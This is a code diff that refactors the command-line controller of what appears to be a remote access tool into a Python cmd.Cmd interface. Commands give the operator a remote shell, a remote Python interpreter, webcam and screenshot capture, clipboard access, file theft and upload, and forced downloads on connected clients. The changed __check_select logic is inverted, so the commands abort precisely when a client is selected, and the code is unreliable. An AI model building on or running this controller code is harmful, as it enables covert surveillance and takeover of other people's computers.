@@ -2,6 +2,7 @@ import logging
 import os
 import platform
 import socket
+import cmd
 from contextlib import suppress
 
 from cryptography import x509
@@ -45,52 +46,45 @@ paste
 receive
 send
 download
-exit/back
+exit
 """
 
 
-class ServerCLI(BaseServer):
+class ServerCLI(BaseServer, cmd.Cmd):
     """ CLI for BaseServer """
 
+    prompt = "> "
+    client = None
+
     def __init__(self, certificate: x509.Certificate, private_key: ec.EllipticCurvePrivateKey):
-        super().__init__(certificate, private_key)
+        BaseServer.__init__(self, certificate, private_key)
+        cmd.Cmd.__init__(self)
 
-    def cli(self) -> None:
-        """ Start CLI """
-        while True:
-            try:
-                self.menu()
-            except KeyboardInterrupt:
-                print('Ctrl-C detected: Shutting down server')
-                self.shutdown()
-                break
-            except Exception as error:
-                logging.critical('Critical errors occurred: %s' % str(error))
+    def default(self, _) -> None:
+        """ Default error if command not found """
+        print('Command was not recognized, type "help" for help.')
 
-    def menu(self) -> None:
-        """ Menu for interacting with clients """
-        command, *args = input('> ').split()
+    def do_shutdown(self, _) -> bool:
+        """ Shutdown the server """
+        self.shutdown()
+        return True
 
-        match command:
-            case 'help':
-                print(menu_help)
-            case 'open':
-                self.select(args)
-            case 'list':
-                self.list_cli()
-            case 'shutdown':
-                raise KeyboardInterrupt
-            case _:
-                print('Command was not recognized, type "help" for help.')
+    def do_help(self, _) -> None:
+        """ Print help message """
+        if self.client is None:
+            print(menu_help)
+        else:
+            print(interact_help)
 
-    def _select(self, *args) -> None:
+    def __check_select(self) -> bool | None:
+        """ Check if a client is selected """
+        if self.client is not None:
+            print("Client has already been selected.")
+            return True
+
+    def do_open(self, id) -> None:
         """ Interact with a client """
-        selected_client = None
-        argument = args[0]
-
-        if not argument:
-            print('No client ID was given')
-            return
+        if self.__check_select(): return
 
         # Create a copy of the clients list
         # This ensures the list is looped through entirely
@@ -99,70 +93,36 @@ class ServerCLI(BaseServer):
 
         # Check if the given id matches a client.id
         for client in clients:
-            if client.id == argument[0]:
-                selected_client = client
+            if client.id == id:
+                self.client = client
                 break
 
-        if selected_client is None:
+        if self.client is None:
             print('Invalid client ID')
             return
 
-        while True:
-            try:
-                if self.interact(selected_client):
-                    break
-            except KeyboardInterrupt:
-                print('Ctrl-C detected: Returning to menu')
-                break
+        self.prompt = f'{self.client.address[0]}> '
 
-    def select(self, args):
-        """ Interact with client while catching errors """
-        try:
-            self._select(args)
-        except KeyboardInterrupt:
-            # Quit selector when ctrl-c is detected
-            print()
-        except Exception as error:
-            logging.error('Client experiened an error: %s' % str(error))
+    def do_exit(self, _) -> None:
+        """ Go back to the client selection menu """
+        if self.client is None:
+            print("No client is selected. To shutdown the server, use 'shutdown'.")
+            return
 
-    def interact(self, client: Client) -> None:
-        """ Interact with a client """
-        command, *_ = input(f'{client.address[0]}> ').split()
-        match command:
-            case 'help':
-                print(interact_help)
-            case 'exit' | 'back':
-                return True
-            case 'shell':
-                self.shell_cli(client)
-            case 'python':
-                self.python_cli(client)
-            case 'screenshot':
-                self.screenshot_cli(client)
-            case 'webcam':
-                self.webcam_cli(client)
-            case 'copy':
-                self.copy_cli(client)
-            case 'paste':
-                self.paste_cli(client)
-            case 'receive':
-                self.receive_cli(client)
-            case 'send':
-                self.send_cli(client)
-            case 'download':
-                self.download_cli(client)
-            case _:
-                print('Command was not recognized, type "help" for help.')
+        self.client = None
+        self.prompt = '> '
 
-    def list_cli(self):
+    def do_list(self, _) -> None:
         """ CLI for list """
         clients = self.list()
         for client in clients:
             print(f'ID: {client.id} / Address: {client.address}')
 
-    def shell_cli(self, client: Client) -> None:
+    def do_shell(self, _) -> None:
         """ Open a shell to client """
-        logging.debug('Launched shell (%s)' % client.id)
+        if self.__check_select(): return
+
+        logging.debug('Launched shell (%s)' % self.client.id)
         while True:
             command = input('shell> ')
 
@@ -181,27 +141,29 @@ class ServerCLI(BaseServer):
             comm, *_ = command.split()
             if comm.lower() in ['cd', 'chdir']:
 
-                print(client.shell(command).decode(), end='')
+                print(self.client.shell(command).decode(), end='')
                 # TODO: update cwd accordingly
 
             # Increase timeout to 60 seconds for shell
-            client.conn.settimeout(60)
+            self.client.conn.settimeout(60)
             try:
-                print(client.shell(command).decode(), end='')
+                print(self.client.shell(command).decode(), end='')
             except TimeoutError:
-                logging.info('Shell command timed out: %s' % client.id)
+                logging.info('Shell command timed out: %s' % self.client.id)
                 # Prompt user if they want to increase the timeout limit
                 if increase_timeout_prompt():
                     # Indefinitely block for output
-                    client.conn.settimeout(None)
-                    print(client.read().decode(), end='')
+                    self.client.conn.settimeout(None)
+                    print(self.client.read().decode(), end='')
             finally:
                 # Set timeout back to default
-                client.conn.settimeout(socket.getdefaulttimeout())
+                self.client.conn.settimeout(socket.getdefaulttimeout())
 
-    def python_cli(self, client: Client) -> None:
+    def do_python(self, _) -> None:
         """ Open a python interpreter to client """
-        logging.debug('Launched python interpreter (%s)' % client.id)
+        if self.__check_select(): return
+
+        logging.debug('Launched python interpreter (%s)' % self.client.id)
         while True:
             command = input('>>> ')
 
@@ -209,84 +171,98 @@ class ServerCLI(BaseServer):
                 break
 
             # Increase timeout to 60 seconds for python interpreter
-            client.conn.settimeout(60)
+            self.client.conn.settimeout(60)
             try:
-                print(client.python(command).decode(), end='')
+                print(self.client.python(command).decode(), end='')
             except TimeoutError:
-                logging.info('Python command timed out: %s' % client.id)
+                logging.info('Python command timed out: %s' % self.client.id)
                 # Prompt user if they want to increase the timeout limit
                 if increase_timeout_prompt():
                     # Indefinitely block for output
-                    client.conn.settimeout(None)
-                    print(client.read().decode(), end='')
+                    self.client.conn.settimeout(None)
+                    print(self.client.read().decode(), end='')
             finally:
-                client.conn.settimeout(socket.getdefaulttimeout())
+                self.client.conn.settimeout(socket.getdefaulttimeout())
 
-    def screenshot_cli(self, client: Client) -> None:
+    def do_screenshot(self, _) -> None:
         """ Take a screenshot and save it in a file """
+        if self.__check_select(): return
+
         try:
-            filename = screenshot.screenshot(client)
+            filename = screenshot.screenshot(self.client)
         except RuntimeError as error:
             print(str(error))
         else:
             print(f'Saved screenshot: {filename}')
 
-    def webcam_cli(self, client: Client) -> None:
+    def do_webcam(self, _) -> None:
         """ Capture webcam """
+        if self.__check_select(): return
+
         try:
-            filename = webcam.webcam(client)
+            filename = webcam.webcam(self.client)
         except RuntimeError as error:
             print(str(error))
         else:
             print(f'Saved webcam capture: {filename}')
 
-    def copy_cli(self, client: Client) -> None:
+    def do_copy(self, _) -> None:
         """ Copy to client clipboard """
+        if self.__check_select(): return
+
         text = input('Text to copy: ')
         try:
-            clipboard.copy(client, text)
+            clipboard.copy(self.client, text)
         except RuntimeError as error:
             print(str(error))
         else:
             print('Copied to clipboard successfully')
 
-    def paste_cli(self, client: Client) -> None:
+    def do_paste(self, _) -> None:
         """ Paste from client clipboard """
+        if self.__check_select(): return
+
         try:
-            content = clipboard.paste(client)
+            content = clipboard.paste(self.client)
         except RuntimeError as error:
             print(str(error))
         else:
             print(f'Clipboard:\n"{content}"')
 
-    def receive_cli(self, client: Client) -> None:
+    def do_receive(self, _) -> None:
         """ Receive a file from the client """
+        if self.__check_select(): return
+
         filename = input('File to transfer: ')
         save_name = input('Save file as: ')
         try:
-            filetransfer.receive(client, filename, save_name)
+            filetransfer.receive(self.client, filename, save_name)
         except RuntimeError as error:
             print(str(error))
         else:
             print('File transferred successfully')
 
-    def send_cli(self, client: Client) -> None:
+    def do_send(self, _) -> None:
         """ Send a file to client """
+        if self.__check_select(): return
+
         filename = input('Filename: ')
         save_name = input('Save file as: ')
         try:
-            filetransfer.send(client, filename, save_name)
+            filetransfer.send(self.client, filename, save_name)
         except RuntimeError as error:
             print(str(error))
         else:
             print('File transferred successfully')
 
-    def download_cli(self, client: Client) -> None:
+    def do_download(self, _) -> None:
         """ Make the client download a file from the web """
+        if self.__check_select(): return
+
         url = input('File URL: ')
         save_name = input('Save file as: ')
         try:
-            download.download(client, url, save_name)
+            download.download(self.client, url, save_name)
         except RuntimeError as error:
             print(str(error))
         else:
@@ -312,4 +288,4 @@ if __name__ == '__main__':
     print(connection.id.encode())
 
     # Begin server CLI
-    server.cli()
+    server.cmdloop()
